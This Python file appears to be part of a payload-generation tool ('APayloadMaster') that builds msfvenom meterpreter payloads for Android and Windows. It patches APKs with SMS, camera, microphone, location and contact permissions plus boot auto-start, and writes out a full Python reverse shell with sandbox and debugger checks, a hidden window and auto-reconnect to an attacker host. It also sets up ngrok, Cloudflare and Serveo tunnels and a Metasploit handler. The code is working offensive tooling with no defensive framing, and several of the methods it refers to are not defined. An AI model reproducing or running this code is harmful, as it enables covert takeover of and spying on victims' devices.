import os
import subprocess
import requests
import json
import time
import threading
import base64
from datetime import datetime
from cryptography.fernet import Fernet

class PayloadCreator:
    def __init__(self, db):
        self.db = db
        self.output_dir = "output/payloads"
        os.makedirs(self.output_dir, exist_ok=True)
        self.ngrok_process = None
        self.cloudflare_process = None
    
    def create_payload(self, choice, lhost, lport, **kwargs):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        payload_creators = {
            "1": self.create_android_payload,
            "2": self.create_windows_payload,
            "3": self.create_windows_dll_payload,
            "4": self.create_linux_payload,
            "5": self.create_macos_payload,
            "6": self.create_python_payload,
            "7": self.create_powershell_payload,
            "8": self.create_bash_payload
        }
        
        if choice in payload_creators:
            try:
                payload_file = payload_creators[choice](lhost, lport, timestamp, **kwargs)
                
                if payload_file and os.path.exists(payload_file):
                    # Calculate hash and size
                    file_hash = self.calculate_hash(payload_file)
                    file_size = os.path.getsize(payload_file)
                    
                    # Apply additional features
                    if kwargs.get('encrypt'):
                        payload_file = self.apply_encryption(payload_file, kwargs.get('encryption_type'))
                    
                    if kwargs.get('obfuscate'):
                        payload_file = self.apply_obfuscation(payload_file, kwargs.get('obfuscation_level'))
                    
                    if kwargs.get('evade_av'):
                        payload_file = self.apply_av_evasion(payload_file, kwargs.get('evasion_technique'))
                    
                    # Store in database
                    payload_data = {
                        'filename': os.path.basename(payload_file),
                        'filepath': payload_file,
                        'platform': self.get_platform_from_choice(choice),
                        'lhost': lhost,
                        'lport': lport,
                        'encryption_type': kwargs.get('encryption_type'),
                        'obfuscation_level': kwargs.get('obfuscation_level'),
                        'hash': file_hash,
                        'size': file_size,
                        'metadata': kwargs
                    }
                    
                    payload_id = self.db.add_payload(payload_data)
                    
                    return {
                        'id': payload_id,
                        'path': payload_file,
                        'size': file_size,
                        'hash': file_hash,
                        'lhost': lhost,
                        'lport': lport
                    }
            except Exception as e:
                print(f"[!] Error creating payload: {e}")
                return None
        return None
    
    def create_android_payload(self, lhost, lport, timestamp, **kwargs):
        output_file = f"{self.output_dir}/android_{timestamp}.apk"
        
        # Enhanced Android payload with more options
        payload_type = kwargs.get('android_payload_type', 'meterpreter/reverse_tcp')
        
        cmd = [
            "msfvenom", "-p", f"android/{payload_type}",
            f"LHOST={lhost}", f"LPORT={lport}",
            "--platform", "android",
            "-a", "dalvik",
            "--encoder", "x86/shikata_ga_nai",
            "-i", "3",
            "-o", output_file
        ]
        
        try:
            print(f"[*] Creating Android payload with {payload_type}...")
            subprocess.run(cmd, check=True, capture_output=True)
            
            # Add auto-permissions and features
            self.enhance_android_apk(output_file)
            
            return output_file
        except subprocess.CalledProcessError as e:
            print(f"[!] Error: {e.stderr.decode()}")
            return None
    
    def enhance_android_apk(self, apk_path):
        """Add advanced features to Android APK"""
        try:
            # Decompile
            subprocess.run(["apktool", "d", apk_path, "-o", "temp_apk", "-f"], 
                          capture_output=True)
            
            # Modify AndroidManifest.xml
            manifest_path = "temp_apk/AndroidManifest.xml"
            if os.path.exists(manifest_path):
                with open(manifest_path, "r") as f:
                    content = f.read()
                
                # Add permissions
                permissions = [
                    '<uses-permission android:name="android.permission.INTERNET"/>',
                    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                    '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
                    '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
                    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
                    '<uses-permission android:name="android.permission.SEND_SMS"/>',
                    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
                    '<uses-permission android:name="android.permission.READ_SMS"/>',
                    '<uses-permission android:name="android.permission.WRITE_SMS"/>',
                    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                    '<uses-permission android:name="android.permission.CAMERA"/>',
                    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
                    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
                    '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
                    '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
                    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
                    '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>',
                    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
                    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
                    '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
                    '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>'
                ]
                
                for perm in permissions:
                    if perm not in content:
                        content = content.replace('</manifest>', f'{perm}\n</manifest>')
                
                # Add service for auto-start
                service_code = '''
                <service
                    android:name=".PayloadService"
                    android:enabled="true"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.BOOT_COMPLETED" />
                        <action android:name="android.intent.action.USER_PRESENT" />
                        <action android:name="android.intent.action.SCREEN_ON" />
                    </intent-filter>
                </service>
                
                <receiver
                    android:name=".BootReceiver"
                    android:enabled="true"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.BOOT_COMPLETED" />
                    </intent-filter>
                </receiver>
                '''
                
                content = content.replace('</application>', f'{service_code}\n</application>')
                
                with open(manifest_path, "w") as f:
                    f.write(content)
            
            # Rebuild
            subprocess.run(["apktool", "b", "temp_apk", "-o", apk_path], 
                          capture_output=True)
            
            # Sign
            self.sign_apk(apk_path)
            
            # Cleanup
            import shutil
            shutil.rmtree("temp_apk", ignore_errors=True)
            
            print("[+] Android APK enhanced with auto-start and permissions")
            
        except Exception as e:
            print(f"[!] APK enhancement error: {e}")
    
    def sign_apk(self, apk_path):
        """Sign APK with debug keystore"""
        keystore = "debug.keystore"
        
        # Create keystore if not exists
        if not os.path.exists(keystore):
            subprocess.run([
                "keytool", "-genkey", "-v",
                "-keystore", keystore,
                "-alias", "androiddebugkey",
                "-keyalg", "RSA",
                "-keysize", "2048",
                "-validity", "10000",
                "-storepass", "android",
                "-keypass", "android",
                "-dname", "CN=Android Debug,O=Android,C=US"
            ], input=b"\n", capture_output=True)
        
        # Sign APK
        subprocess.run([
            "jarsigner", "-verbose",
            "-keystore", keystore,
            "-storepass", "android",
            "-keypass", "android",
            apk_path,
            "androiddebugkey"
        ], capture_output=True)
    
    def create_windows_payload(self, lhost, lport, timestamp, **kwargs):
        output_file = f"{self.output_dir}/windows_{timestamp}.exe"
        
        # Windows payload with evasion
        payload_type = kwargs.get('windows_payload_type', 'windows/meterpreter/reverse_tcp')
        
        cmd = [
            "msfvenom", "-p", payload_type,
            f"LHOST={lhost}", f"LPORT={lport}",
            "-f", "exe",
            "--encoder", "x86/shikata_ga_nai",
            "-i", "5",
            "-b", "\\x00\\x0a\\x0d",
            "-o", output_file
        ]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            return output_file
        except subprocess.CalledProcessError as e:
            print(f"[!] Error: {e.stderr.decode()}")
            return None
    
    def create_python_payload(self, lhost, lport, timestamp, **kwargs):
        output_file = f"{self.output_dir}/python_{timestamp}.py"
        
        # Advanced Python payload with multiple features
        payload_template = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Reverse Shell with Multiple Features
Auto-generated by APayloadMaster
"""

import socket
import subprocess
import os
import sys
import platform
import threading
import time
import json
import base64
import zlib
import ctypes
import urllib.request
import ssl

# Configuration
LHOST = "{lhost}"
LPORT = {lport}
RECONNECT_DELAY = 10

def bypass_av():
    """Basic AV bypass techniques"""
    try:
        # Check if running in sandbox
        if platform.system().lower() == "windows":
            # Check for sandbox artifacts
            sandbox_processes = ["vmsrvc", "vboxtray", "vmtoolsd", "vmwaretray"]
            for proc in sandbox_processes:
                if proc in subprocess.check_output("tasklist", shell=True).decode().lower():
                    return False
            
            # Check for debuggers
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return False
    except:
        pass
    return True

def reverse_shell():
    """Main reverse shell function"""
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            
            # Connect
            s.connect((LHOST, LPORT))
            
            # Send system info
            system_info = {{
                "platform": platform.platform(),
                "hostname": platform.node(),
                "user": os.getenv("USERNAME") or os.getenv("USER"),
                "pid": os.getpid()
            }}
            s.send(json.dumps(system_info).encode())
            
            # Command loop
            while True:
                try:
                    # Receive command
                    command = s.recv(4096).decode().strip()
                    
                    if not command:
                        break
                    
                    if command.lower() == 'exit':
                        break
                    
                    if command.lower() == 'background':
                        # Go to background
                        threading.Thread(target=reverse_shell).start()
                        break
                    
                    # Execute command
                    if command.startswith("cd "):
                        os.chdir(command[3:])
                        output = f"Changed directory to {{os.getcwd()}}"
                    else:
                        try:
                            output = subprocess.check_output(
                                command, 
                                shell=True, 
                                stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL
                            ).decode()
                        except subprocess.CalledProcessError as e:
                            output = e.output.decode() if e.output else str(e)
                        except Exception as e:
                            output = str(e)
                    
                    # Send output
                    s.send(output.encode())
                    
                except socket.timeout:
                    s.send(b"[*] Connection timeout, still alive\\n")
                    continue
                except Exception as e:
                    s.send(f"[!] Error: {{str(e)}}\\n".encode())
                    break
            
            s.close()
            
        except Exception as e:
            pass
        
        # Reconnect after delay
        time.sleep(RECONNECT_DELAY)

def main():
    """Main entry point"""
    if not bypass_av():
        sys.exit(0)
    
    # Hide window on Windows
    if platform.system().lower() == "windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Start reverse shell
    reverse_shell()

if __name__ == "__main__":
    # Run in thread for persistence
    thread = threading.Thread(target=main)
    thread.daemon = True
    thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
'''
        
        with open(output_file, "w") as f:
            f.write(payload_template)
        
        os.chmod(output_file, 0o755)
        return output_file
    
    def setup_port_forwarding(self, method, lport, token=None):
        """Setup port forwarding with various methods"""
        print(f"[*] Setting up {method} port forwarding...")
        
        if method == "ngrok":
            return self.setup_ngrok(lport, token)
        elif method == "cloudflare":
            return self.setup_cloudflare_tunnel(lport, token)
        elif method == "serveo":
            return self.setup_serveo(lport)
        else:
            return None, None
    
    def setup_ngrok(self, lport, token=None):
        """Setup Ngrok for port forwarding"""
        try:
            if token:
                # Authenticate
                subprocess.run(["ngrok", "authtoken", token], capture_output=True)
            
            # Start ngrok
            self.ngrok_process = subprocess.Popen(
                ["ngrok", "tcp", str(lport)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)  # Wait for ngrok to start
            
            # Get public URL
            try:
                resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                tunnels = resp.json()["tunnels"]
                
                for tunnel in tunnels:
                    if tunnel["proto"] == "tcp":
                        public_url = tunnel["public_url"]
                        # Parse URL: tcp://x.tcp.ngrok.io:12345
                        ngrok_host = public_url.split("//")[1].split(":")[0]
                        ngrok_port = public_url.split(":")[-1]
                        
                        print(f"{Colors().GREEN}[+] Ngrok URL: {public_url}{Colors().ENDC}")
                        print(f"{Colors().GREEN}[+] Use: LHOST={ngrok_host}, LPORT={ngrok_port}{Colors().ENDC}")
                        
                        return ngrok_host, ngrok_port
            except:
                pass
            
            return "0.tcp.ngrok.io", lport
            
        except Exception as e:
            print(f"{Colors().RED}[!] Ngrok error: {e}{Colors().ENDC}")
            return None, None
    
    def setup_cloudflare_tunnel(self, lport, token):
        """Setup CloudFlare Tunnel"""
        try:
            # Note: This requires cloudflared installed
            self.cloudflare_process = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"localhost:{lport}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            print(f"{Colors().GREEN}[+] CloudFlare tunnel started{Colors().ENDC}")
            print(f"{Colors().YELLOW}[*] Note: Configure CloudFlare dashboard for custom domains{Colors().ENDC}")
            
            return f"your-domain.trycloudflare.com", lport
            
        except Exception as e:
            print(f"{Colors().RED}[!] CloudFlare error: {e}{Colors().ENDC}")
            return None, None
    
    def setup_serveo(self, lport):
        """Setup Serveo port forwarding"""
        try:
            serveo_process = subprocess.Popen(
                ["ssh", "-R", f"80:localhost:{lport}", "serveo.net"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            print(f"{Colors().GREEN}[+] Serveo started{Colors().ENDC}")
            print(f"{Colors().YELLOW}[*] Check output for assigned URL{Colors().ENDC}")
            
            return f"{lport}.serveo.net", lport
            
        except Exception as e:
            print(f"{Colors().RED}[!] Serveo error: {e}{Colors().ENDC}")
            return None, None
    
    def start_multi_handler(self, lport):
        """Start Metasploit multi/handler"""
        handler_script = f"""
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        
        with open("handler.rc", "w") as f:
            f.write(handler_script)
        
        print(f"{Colors().GREEN}[*] Starting multi/handler on port {lport}{Colors().ENDC}")
        subprocess.Popen(["msfconsole", "-r", "handler.rc"])
    
    def calculate_hash(self, filepath):
        """Calculate SHA256 hash of file"""
        import hashlib
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def get_platform_from_choice(self, choice):
        platforms = {
            "1": "Android",
            "2": "Windows",
            "3": "Windows DLL",
            "4": "Linux",
            "5": "macOS",
            "6": "Python",
            "7": "PowerShell",
            "8": "Bash"
        }
        return platforms.get(choice, "Unknown")
